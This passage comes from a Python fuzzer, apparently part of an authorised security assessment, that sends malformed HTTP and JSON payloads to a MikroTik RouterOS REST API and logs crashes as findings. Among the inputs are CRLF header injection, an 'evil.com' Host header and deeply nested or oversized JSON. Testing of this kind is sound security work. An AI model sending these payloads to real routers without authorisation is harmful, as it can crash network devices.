    # Partial request (no terminating CRLF)
    tests.append((
        "connection_handling",
        "partial_request",
        "Partial HTTP request (no final CRLF)",
        f"GET /rest/system/identity HTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}",
        "raw",
    ))

    # ── 2.11: Content-Type Abuse ───────────────────────────────────────────
    ct_types = [
        ("ct_xml", "application/xml", '<?xml version="1.0"?><root><name>test</name></root>'),
        ("ct_form", "application/x-www-form-urlencoded", "name=TestRouter"),
        ("ct_multipart", "multipart/form-data; boundary=FUZZ", "--FUZZ\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nTestRouter\r\n--FUZZ--"),
        ("ct_text", "text/plain", '{"name":"TestRouter"}'),
        ("ct_empty", "", '{"name":"TestRouter"}'),
        ("ct_binary", "application/octet-stream", '{"name":"TestRouter"}'),
        ("ct_long", "application/json; " + "x" * 10000, '{"name":"TestRouter"}'),
        ("ct_null_byte", "application/json\x00text/html", '{"name":"TestRouter"}'),
        ("ct_charset_bad", "application/json; charset=INVALID-999", '{"name":"TestRouter"}'),
        ("ct_semicolons", "application/json;;;;;;;;", '{"name":"TestRouter"}'),
    ]
    for ct_name, ct_value, ct_body in ct_types:
        raw_req = (
            f"POST /rest/system/identity HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Authorization: {auth_header}\r\n"
            f"Content-Type: {ct_value}\r\n"
            f"Content-Length: {len(ct_body)}\r\n"
            f"\r\n"
            f"{ct_body}"
        )
        tests.append(("content_type", ct_name, f"Content-Type: {ct_value[:60]}", raw_req, "raw"))

    # ── 2.12: Host Header Attacks ──────────────────────────────────────────
    host_payloads = [
        ("host_empty", ""),
        ("host_localhost", "localhost"),
        ("host_127", "127.0.0.1"),
        ("host_long", "A" * 10000),
        ("host_null", "\x00"),
        ("host_port", f"{TARGET}:99999"),
        ("host_crlf", f"{TARGET}\r\nX-Injected: true"),
        ("host_brackets", f"[{TARGET}]"),
    ]
    for h_name, h_value in host_payloads:
        raw_req = (
            f"GET /rest/system/identity HTTP/1.1\r\n"
            f"Host: {h_value}\r\n"
            f"Authorization: {auth_header}\r\n"
            f"\r\n"
        )
        tests.append(("host_header", h_name, f"Host header: {truncate(h_value, 60)}", raw_req, "raw"))

    # ── 2.13: Auth Header Fuzzing ──────────────────────────────────────────
    import base64
    auth_payloads = [
        ("auth_empty", "Basic "),
        ("auth_no_colon", "Basic " + base64.b64encode(b"adminTestPass123").decode()),
        ("auth_many_colons", "Basic " + base64.b64encode(b"admin:Test:Pass:123").decode()),
        ("auth_long_user", "Basic " + base64.b64encode(("A" * 10000 + ":pass").encode()).decode()),
        ("auth_long_pass", "Basic " + base64.b64encode(("admin:" + "B" * 10000).encode()).decode()),
        ("auth_null_byte", "Basic " + base64.b64encode(b"admin\x00:TestPass123").decode()),
        ("auth_bearer", "Bearer faketoken12345"),
        ("auth_digest", 'Digest username="admin", realm="test", nonce="abc"'),
        ("auth_no_scheme", base64.b64encode(b"admin:TestPass123").decode()),
        ("auth_double_basic", "Basic Basic " + base64.b64encode(b"admin:TestPass123").decode()),
        ("auth_invalid_b64", "Basic !!!not-base64!!!"),
        ("auth_unicode", "Basic " + base64.b64encode("admin:p\xe4ss".encode("latin-1")).decode()),
    ]
    for a_name, a_value in auth_payloads:
        raw_req = (
            f"GET /rest/system/identity HTTP/1.1\r\n"
            f"Host: {TARGET}\r\n"
            f"Authorization: {a_value}\r\n"
            f"\r\n"
        )
        tests.append(("auth_fuzzing", a_name, f"Auth header fuzz: {a_name}", raw_req, "raw"))

    # ── 2.14: Pipeline / Keep-Alive Abuse ──────────────────────────────────
    # Multiple requests in a single TCP connection
    pipeline_tests = [
        (
            "pipeline_two_gets",
            "Two GET requests pipelined",
            (
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
                f"GET /rest/system/resource HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "pipeline_post_get",
            "POST then GET pipelined",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: 22\r\n"
                f"\r\n"
                f'{{\"name\":\"TestRouter\"}}'
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "pipeline_ten_gets",
            "Ten GET requests pipelined",
            (
                (
                    f"GET /rest/system/identity HTTP/1.1\r\n"
                    f"Host: {TARGET}\r\n"
                    f"Authorization: {auth_header}\r\n"
                    f"\r\n"
                ) * 10
            ),
        ),
    ]
    for p_name, p_desc, p_payload in pipeline_tests:
        tests.append(("pipeline", p_name, p_desc, p_payload, "raw"))

    # ── 2.15: Malformed Request Lines ──────────────────────────────────────
    malformed_req_tests = [
        (
            "req_no_path",
            "Request with no path",
            f"GET HTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}\r\n\r\n",
        ),
        (
            "req_absolute_uri",
            "Absolute URI in request line",
            f"GET http://{TARGET}/rest/system/identity HTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}\r\n\r\n",
        ),
        (
            "req_backslash_path",
            "Backslash in path",
            f"GET /rest\\system\\identity HTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}\r\n\r\n",
        ),
        (
            "req_tab_separator",
            "Tab instead of space in request line",
            f"GET\t/rest/system/identity\tHTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}\r\n\r\n",
        ),
        (
            "req_lf_only",
            "LF-only line endings (no CR)",
            f"GET /rest/system/identity HTTP/1.1\nHost: {TARGET}\nAuthorization: {auth_header}\n\n",
        ),
        (
            "req_extra_spaces",
            "Extra spaces in request line",
            f"GET  /rest/system/identity  HTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}\r\n\r\n",
        ),
        (
            "req_null_path",
            "Null byte in path",
            f"GET /rest/system\x00/identity HTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}\r\n\r\n",
        ),
        (
            "req_star_path",
            "Asterisk path (OPTIONS-style)",
            f"OPTIONS * HTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}\r\n\r\n",
        ),
        (
            "req_connect",
            "CONNECT method",
            f"CONNECT {TARGET}:80 HTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}\r\n\r\n",
        ),
        (
            "req_trace",
            "TRACE method",
            f"TRACE /rest/system/identity HTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}\r\n\r\n",
        ),
        (
            "req_propfind",
            "PROPFIND method (WebDAV)",
            f"PROPFIND /rest/ HTTP/1.1\r\nHost: {TARGET}\r\nAuthorization: {auth_header}\r\nDepth: 1\r\n\r\n",
        ),
    ]
    for m_name, m_desc, m_payload in malformed_req_tests:
        tests.append(("malformed_request", m_name, m_desc, m_payload, "raw"))

    # ── 2.16: Multiple/Conflicting Headers ─────────────────────────────────
    conflict_tests = [
        (
            "multi_host",
            "Two different Host headers",
            (
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Host: evil.com\r\n"
                f"Authorization: {auth_header}\r\n"
                f"\r\n"
            ),
        ),
        (
            "multi_auth",
            "Two different Authorization headers",
            (
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Authorization: Basic aW52YWxpZDppbnZhbGlk\r\n"
                f"\r\n"
            ),
        ),
        (
            "multi_content_type",
            "Conflicting Content-Types",
            (
                f"POST /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Type: text/html\r\n"
                f"Content-Length: 22\r\n"
                f"\r\n"
                f'{{\"name\":\"TestRouter\"}}'
            ),
        ),
        (
            "header_no_value",
            "Header with no value",
            (
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"X-Empty:\r\n"
                f"\r\n"
            ),
        ),
        (
            "header_no_colon",
            "Header line without colon",
            (
                f"GET /rest/system/identity HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"NotAHeaderJustText\r\n"
                f"\r\n"
            ),
        ),
    ]
    for c_name, c_desc, c_payload in conflict_tests:
        tests.append(("header_conflict", c_name, c_desc, c_payload, "raw"))

    # Now execute all HTTP layer tests
    log(f"\nTotal HTTP layer tests queued: {len(tests)}")

    for category, name, desc, payload, mode in tests:
        test_index += 1

        if mode == "slow":
            result = send_raw_slow(payload, delay_per_byte=1.0, max_bytes=10, timeout=20)
        else:
            result = send_raw_http(payload)

        is_anomaly = False
        anomaly_reasons = []

        if result["error"] == "timeout":
            is_anomaly = True
            anomaly_reasons.append("request timed out")
        elif result["error"] and "connection" in str(result["error"]).lower():
            is_anomaly = True
            anomaly_reasons.append(f"connection error: {result['error']}")
        elif result["response_time"] > SLOW_THRESHOLD and mode != "slow":
            is_anomaly = True
            anomaly_reasons.append(f"slow response: {result['response_time']}s")
        elif result["status_code"] >= 500:
            is_anomaly = True
            anomaly_reasons.append(f"server error: HTTP {result['status_code']}")
        elif result["response_size"] == 0 and result["error"] is None:
            is_anomaly = True
            anomaly_reasons.append("empty response (connection dropped)")

        if is_anomaly:
            anomaly_count += 1

        details = {
            "category": category,
            "payload_preview": truncate(payload, 500),
            "http_status": result["status_code"],
            "response_size": result["response_size"],
            "response_time": result["response_time"],
            "error": result["error"],
            "response_preview": result["response_body"][:300] if result["response_body"] else None,
            "mode": mode,
        }
        if anomaly_reasons:
            details["anomaly_reasons"] = anomaly_reasons

        ec.add_test(
            category=f"http_{category}",
            name=f"http_{name}",
            description=desc,
            result="ANOMALY" if is_anomaly else f"HTTP {result['status_code']}",
            details=details,
            anomaly=is_anomaly,
        )

        # Health check every ALIVE_CHECK_INTERVAL tests
        if test_index % ALIVE_CHECK_INTERVAL == 0:
            health = check_router_alive()
            if not health.get("alive"):
                crash_count += 1
                log(f"  ROUTER DOWN after HTTP test '{name}'! Waiting for recovery...")
                ec.add_finding(
                    severity="HIGH",
                    title=f"Router crash/unresponsive after HTTP layer test: {name}",
                    description=(
                        f"Router became unresponsive after HTTP layer test '{name}' "
                        f"({desc}). Payload preview: {truncate(payload, 300)}"
                    ),
                    evidence_refs=[f"http_{name}"],
                    cwe="CWE-400",
                )
                wait_for_router(max_wait=90)
                time.sleep(5)

    log(f"\nStrategy 2 complete: {test_index} tests, {anomaly_count} anomalies, {crash_count} crashes")
    return test_index, anomaly_count, crash_count


# ── Strategy 3: Generation-Based Extreme Values ─────────────────────────────

def run_strategy3_generation_extreme(ec):
    """Generation-based extreme value fuzzing — ~50 tests."""
    log("=" * 60)
    log("STRATEGY 3: Generation-Based Extreme Values")
    log("=" * 60)

    crash_count = 0
    anomaly_count = 0
    test_index = 0

    endpoint = "/system/identity"

    # Build all extreme payloads
    extreme_tests = []

    # 3.1: Extremely deeply nested arrays
    for depth in [100, 500, 1000]:
        # Build nested array: [[[[...]]]]
        payload_str = "[" * depth + "1" + "]" * depth
        extreme_tests.append((
            f"nested_array_{depth}",
            f"Nested array at depth {depth}",
            payload_str,
            "raw_json",
        ))

    # 3.2: Extremely deeply nested objects
    for depth in [100, 500, 1000]:
        inner = '"val":1'
        for _ in range(depth):
            inner = f'"a":{{{inner}}}'
        payload_str = "{" + inner + "}"
        extreme_tests.append((
            f"nested_object_{depth}",
            f"Nested object at depth {depth}",
            payload_str,
            "raw_json",
        ))

    # 3.3: Whitespace variations
    whitespace_variants = [
        ("tabs", '{\t"name"\t:\t"TestRouter"\t}'),
        ("newlines", '{\n"name"\n:\n"TestRouter"\n}'),
        ("spaces", '{   "name"   :   "TestRouter"   }'),
        ("mixed", '{ \t\n "name" \t\n : \t\n "TestRouter" \t\n }'),
        ("leading_ws", '   \t\n  {"name":"TestRouter"}'),
        ("trailing_ws", '{"name":"TestRouter"}   \t\n  '),
        ("no_ws", '{"name":"TestRouter"}'),
    ]
    for ws_name, ws_payload in whitespace_variants:
        extreme_tests.append((
            f"whitespace_{ws_name}",
            f"JSON with {ws_name} whitespace",
            ws_payload,
            "raw_json",
        ))

    # 3.4: Duplicate keys at scale
    for count in [10, 50, 100]:
        pairs = ", ".join(f'"name":"value{i}"' for i in range(count))
        payload_str = "{" + pairs + "}"
        extreme_tests.append((
            f"duplicate_keys_{count}",
            f"{count} duplicate 'name' keys",
            payload_str,
            "raw_json",
        ))

    # 3.5: Keys with special characters
    special_key_tests = [
        ("empty_key", '{"":"value"}'),
        ("space_key", '{"key with spaces":"value"}'),
        ("dot_key", '{"key.with.dots":"value"}'),
        ("slash_key", '{"key/with/slashes":"value"}'),
        ("backslash_key", '{"key\\\\with\\\\backslashes":"value"}'),
        ("unicode_key", '{"\\u0000key":"value"}'),
        ("emoji_key", '{"\U0001f4a9":"value"}'),
        ("newline_key", '{"key\\nwith\\nnewlines":"value"}'),
        ("long_key_1000", '{"' + "K" * 1000 + '":"value"}'),
        ("long_key_65535", '{"' + "K" * 65535 + '":"value"}'),
    ]
    for sk_name, sk_payload in special_key_tests:
        extreme_tests.append((
            f"special_key_{sk_name}",
            f"JSON with {sk_name}",
            sk_payload,
            "raw_json",
        ))

    # 3.6: Maximum precision floats
    float_tests = [
        ("max_double", '{"name":"test","val":1.7976931348623157e+308}'),
        ("min_double", '{"name":"test","val":5e-324}'),
        ("neg_max", '{"name":"test","val":-1.7976931348623157e+308}'),
        ("infinity", '{"name":"test","val":1e999999}'),
        ("neg_infinity", '{"name":"test","val":-1e999999}'),
        ("zero_exp", '{"name":"test","val":0e0}'),
        ("many_decimals", '{"name":"test","val":1.' + "1" * 1000 + '}'),
    ]
    for f_name, f_payload in float_tests:
        extreme_tests.append((
            f"float_{f_name}",
            f"Float edge case: {f_name}",
            f_payload,
            "raw_json",
        ))

    # 3.7: Scientific notation edge cases
    sci_tests = [
        ("huge_exp", '{"name":"test","val":1e999999}'),
        ("neg_huge_exp", '{"name":"test","val":1e-999999}'),
        ("exp_overflow", '{"name":"test","val":9.999e99999999999999}'),
        ("exp_neg_overflow", '{"name":"test","val":1e-99999999999999}'),
        ("plus_exp", '{"name":"test","val":1e+308}'),
    ]
    for s_name, s_payload in sci_tests:
        extreme_tests.append((
            f"scientific_{s_name}",
            f"Scientific notation: {s_name}",
            s_payload,
            "raw_json",
        ))

    # 3.8: Binary data in JSON string
    binary_payload = '{"name":"' + "".join(f"\\u{i:04x}" for i in range(1, 32)) + '"}'
    extreme_tests.append((
        "binary_in_string",
        "Binary control chars as unicode escapes in JSON string",
        binary_payload,
        "raw_json",
    ))

    raw_binary = '{"name":"' + "\x01\x02\x03\x04\x05\x06\x07\x08" + '"}'
    extreme_tests.append((
        "raw_binary_in_string",
        "Raw binary bytes in JSON string value",
        raw_binary,
        "raw_json",
    ))

    # 3.9: Extremely long key names
    for klen in [1000, 10000, 65535]:
        key = "K" * klen
        payload_str = '{' + f'"{key}":"value"' + '}'
        extreme_tests.append((
            f"long_key_{klen}",
            f"Key name of length {klen}",
            payload_str,
            "raw_json",
        ))

    # 3.10: Malformed JSON edge cases
    malformed_tests = [
        ("trailing_comma", '{"name":"TestRouter",}'),
        ("single_quotes", "{'name':'TestRouter'}"),
        ("no_quotes_key", '{name:"TestRouter"}'),
        ("comments", '{"name":"TestRouter"/* comment */}'),
        ("trailing_data", '{"name":"TestRouter"} extra data here'),
        ("empty_object", '{}'),
        ("empty_array", '[]'),
        ("just_null", 'null'),
        ("just_true", 'true'),
        ("just_string", '"just a string"'),
        ("just_number", '42'),
        ("empty_body", ''),
        ("only_whitespace", '   \t\n  '),
        ("bom_prefix", '\xef\xbb\xbf{"name":"TestRouter"}'),
    ]
    for m_name, m_payload in malformed_tests:
        extreme_tests.append((
            f"malformed_{m_name}",
            f"Malformed JSON: {m_name}",
            m_payload,
            "raw_json",
        ))

    # Now execute all extreme value tests
    log(f"\nTotal extreme value tests queued: {len(extreme_tests)}")
    auth_header = make_auth_header()

    for name, desc, payload_str, mode in extreme_tests:
        test_index += 1

        if mode == "raw_json":
            # Send as raw HTTP to bypass requests library JSON validation
            raw_req = (
                f"POST /rest{endpoint} HTTP/1.1\r\n"
                f"Host: {TARGET}\r\n"
                f"Authorization: {auth_header}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(payload_str.encode('latin-1', errors='replace'))}\r\n"
                f"\r\n"
                f"{payload_str}"
            )
            result = send_raw_http(raw_req)
        else:
            result = send_json_request(endpoint, payload_str)

        is_anomaly = False
        anomaly_reasons = []

        if result["error"] == "timeout":
            is_anomaly = True
            anomaly_reasons.append("request timed out")
        elif result["error"] and "connection" in str(result["error"]).lower():
            is_anomaly = True
            anomaly_reasons.append(f"connection error: {result['error']}")
        elif result["response_time"] > SLOW_THRESHOLD:
            is_anomaly = True
            anomaly_reasons.append(f"slow response: {result['response_time']}s")
        elif result["status_code"] >= 500:
            is_anomaly = True
            anomaly_reasons.append(f"server error: HTTP {result['status_code']}")
        elif result["status_code"] == 0 and result["error"] is None:
            is_anomaly = True
            anomaly_reasons.append("no response / connection dropped")

        if is_anomaly:
            anomaly_count += 1

        details = {
            "payload_preview": truncate(payload_str, 500),
            "http_status": result["status_code"],
            "response_size": result["response_size"],
            "response_time": result["response_time"],
            "error": result["error"],
            "response_preview": result["response_body"][:300] if result["response_body"] else None,
        }
        if anomaly_reasons:
            details["anomaly_reasons"] = anomaly_reasons

        ec.add_test(
            category="extreme_values",
            name=f"extreme_{name}",
            description=desc,
            result="ANOMALY" if is_anomaly else f"HTTP {result['status_code']}",
            details=details,
            anomaly=is_anomaly,
        )

        # Health check every ALIVE_CHECK_INTERVAL tests
        if test_index % ALIVE_CHECK_INTERVAL == 0:
            health = check_router_alive()
            if not health.get("alive"):
                crash_count += 1
                log(f"  ROUTER DOWN after extreme test '{name}'! Waiting for recovery...")
                ec.add_finding(
                    severity="HIGH",
                    title=f"Router crash/unresponsive after extreme value test: {name}",
                    description=(
                        f"Router became unresponsive after extreme value test '{name}' "
                        f"({desc}). Payload preview: {truncate(payload_str, 300)}"
                    ),
                    evidence_refs=[f"extreme_{name}"],
                    cwe="CWE-120",
                )
                wait_for_router(max_wait=90)
                time.sleep(5)

    log(f"\nStrategy 3 complete: {test_index} tests, {anomaly_count} anomalies, {crash_count} crashes")
    return test_index, anomaly_count, crash_count


# ── Main ─────────────────────────────────────────────────────────────────────

def main():
    log("=" * 70)
    log("MikroTik RouterOS CHR 7.20.8 — REST API JSON Parser Fuzzer")
    log("Phase 3: Fuzzing — parse_json_element code path (CVE-2025-10948 area)")
    log(f"Target: {TARGET} ({ADMIN_USER})")
    log("=" * 70)

    # Pre-flight: verify router is alive
    log("\nPre-flight health check...")
    health = check_router_alive()
    if not health.get("alive"):
        log("Router is not responding! Attempting to wait...")
        health = wait_for_router(max_wait=120)
        if not health.get("alive"):
            log("FATAL: Router unreachable. Aborting.")
            sys.exit(1)
    log(f"Router alive: version={health.get('version')}, "
        f"uptime={health.get('uptime')}, "
        f"cpu={health.get('cpu_load')}%, "
        f"free_mem={health.get('free_memory')}")

    # Initialize evidence collector
    ec = EvidenceCollector("rest_json_fuzzer.py", phase=3)

    # Pre-cleanup: remove any leftover objects from previous runs
    cleanup_created_objects()

    total_tests = 0
    total_anomalies = 0
    total_crashes = 0

    # ── Strategy 1: Mutation-Based JSON Fuzzing ──────────────────────────
    try:
        s1_tests, s1_anomalies, s1_crashes = run_strategy1_json_mutations(ec)
        total_tests += s1_tests
        total_anomalies += s1_anomalies
        total_crashes += s1_crashes
    except Exception as e:
        log(f"Strategy 1 error: {e}")
        traceback.print_exc()
        ec.add_test(
            category="error",
            name="strategy1_error",
            description="Strategy 1 encountered an unhandled error",
            result="ERROR",
            details={"error": str(e), "traceback": traceback.format_exc()},
            anomaly=True,
        )

    # Health check between strategies
    log("\nInter-strategy health check...")
    health = check_router_alive()
    if not health.get("alive"):
        log("Router down between strategies! Waiting...")
        wait_for_router(max_wait=120)
        time.sleep(10)

    # ── Strategy 2: HTTP Layer Fuzzing ───────────────────────────────────
    try:
        s2_tests, s2_anomalies, s2_crashes = run_strategy2_http_layer(ec)
        total_tests += s2_tests
        total_anomalies += s2_anomalies
        total_crashes += s2_crashes
    except Exception as e:
        log(f"Strategy 2 error: {e}")
        traceback.print_exc()
        ec.add_test(
            category="error",
            name="strategy2_error",
            description="Strategy 2 encountered an unhandled error",
            result="ERROR",
            details={"error": str(e), "traceback": traceback.format_exc()},
            anomaly=True,
        )

    # Health check between strategies
    log("\nInter-strategy health check...")
    health = check_router_alive()
    if not health.get("alive"):
        log("Router down between strategies! Waiting...")
        wait_for_router(max_wait=120)
        time.sleep(10)

    # ── Strategy 3: Generation-Based Extreme Values ──────────────────────
    try:
        s3_tests, s3_anomalies, s3_crashes = run_strategy3_generation_extreme(ec)
        total_tests += s3_tests
        total_anomalies += s3_anomalies
        total_crashes += s3_crashes
    except Exception as e:
        log(f"Strategy 3 error: {e}")
        traceback.print_exc()
        ec.add_test(
            category="error",
            name="strategy3_error",
            description="Strategy 3 encountered an unhandled error",
            result="ERROR",
            details={"error": str(e), "traceback": traceback.format_exc()},
            anomaly=True,
        )

    # ── Final Cleanup and Reporting ──────────────────────────────────────
    log("\n" + "=" * 60)
    log("FINAL CLEANUP AND REPORTING")
    log("=" * 60)

    # Cleanup any created objects
    cleanup_created_objects()

    # Restore identity if changed
    try:
        requests.post(
            f"{REST_BASE}/system/identity",
            auth=AUTH,
            headers={"Content-Type": "application/json"},
            json={"name": "MikroTik"},
            timeout=10, verify=False)
    except Exception:
        pass

    # Record summary metadata
    ec.results["metadata"]["strategy1_tests"] = s1_tests if 's1_tests' in dir() else 0
    ec.results["metadata"]["strategy2_tests"] = s2_tests if 's2_tests' in dir() else 0
    ec.results["metadata"]["strategy3_tests"] = s3_tests if 's3_tests' in dir() else 0
    ec.results["metadata"]["total_crashes"] = total_crashes
    ec.results["metadata"]["total_anomalies_detected"] = total_anomalies

    # Add crash summary finding if any crashes occurred
    if total_crashes > 0:
        ec.add_finding(
            severity="HIGH" if total_crashes >= 3 else "MEDIUM",
            title=f"Router stability issues: {total_crashes} crash/unresponsive events during fuzzing",
            description=(
                f"The router became unresponsive {total_crashes} time(s) during "
                f"REST API JSON parser fuzzing across {total_tests} test cases. "
                f"This may indicate memory corruption, resource exhaustion, or "
                f"unchecked buffer boundaries in the parse_json_element code path."
            ),
            cwe="CWE-120",
            cvss="7.5",
        )

    # Add anomaly summary finding if significant anomalies
    if total_anomalies > 10:
        ec.add_finding(
            severity="LOW",
            title=f"Elevated anomaly rate during JSON fuzzing: {total_anomalies}/{total_tests}",
            description=(
                f"{total_anomalies} anomalies detected across {total_tests} test cases "
                f"({100*total_anomalies/max(total_tests,1):.1f}% anomaly rate). "
                f"Anomalies include timeouts, slow responses (>{SLOW_THRESHOLD}s), "
                f"server errors (5xx), and dropped connections."
            ),
            cwe="CWE-400",
        )

    # Pull router logs and save evidence
    ec.save("rest_json_fuzzer.json")
    ec.summary()

    log(f"\nFinal tallies:")
    log(f"  Strategy 1 (JSON mutations):    {s1_tests if 's1_tests' in dir() else '?'} tests")
    log(f"  Strategy 2 (HTTP layer):        {s2_tests if 's2_tests' in dir() else '?'} tests")
    log(f"  Strategy 3 (Extreme values):    {s3_tests if 's3_tests' in dir() else '?'} tests")
    log(f"  Total tests:                    {total_tests}")
    log(f"  Total anomalies:                {total_anomalies}")
    log(f"  Total crashes:                  {total_crashes}")
    log(f"  Findings:                       {len(ec.results['findings'])}")


if __name__ == "__main__":
    main()
